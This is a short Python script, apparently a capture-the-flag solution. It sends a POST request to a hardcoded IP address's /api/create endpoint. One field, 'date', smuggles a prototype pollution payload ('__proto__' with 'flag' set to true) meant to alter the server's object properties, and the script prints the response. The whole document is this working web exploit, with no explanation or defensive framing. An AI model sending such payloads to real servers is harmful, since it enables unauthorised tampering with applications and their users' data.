import requests

r = requests.post('http://84.252.128.241/api/create', json={
	'userid':1,
	'title': 'AAAAAAAAAAAAA',
	'body': 'cool body!',
	'date':'{"__proto__":{"flag":true}}'
})
print(r.status_code)
print(r.text)
